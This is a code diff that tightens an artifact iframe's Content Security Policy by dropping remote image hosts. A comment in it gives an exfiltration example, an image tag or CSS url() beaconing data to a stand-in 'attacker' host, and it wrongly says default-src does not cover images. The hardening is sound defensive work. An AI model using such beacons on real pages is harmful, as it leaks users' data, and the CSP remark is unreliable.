@@ -190,6 +190,11 @@ function hashesForFile(filePath: string): string[] {
  * credentials to a remote endpoint, and the embedding iframe carries `sandbox="allow-scripts"`
  * without `allow-same-origin`, so the document sits in an opaque origin with no access to the
  * viewer DOM, the auth cookie, or the artifact API.
+ *
+ * img-src stays same-origin for the same reason connect-src is absent: `default-src 'none'` does
+ * not cover images, so allowing remote hosts would let `<img src="https://attacker/?d=...">` (or a
+ * CSS `url()`) beacon the rendered content straight back out. This frame must be no more permissive
+ * than the viewer it isolates from, whose policy restricts images for exactly this reason.
  */
 function artifactFrameContentSecurityPolicy(): string {
   return [
@@ -198,7 +203,7 @@ function artifactFrameContentSecurityPolicy(): string {
     "form-action 'none'",
     "frame-ancestors 'self'",
     "style-src 'self' 'unsafe-inline'",
-    "img-src 'self' https: data:",
+    "img-src 'self' data: blob:",
     "font-src 'self' data:",
     "script-src 'unsafe-inline'",
   ].join("; ");
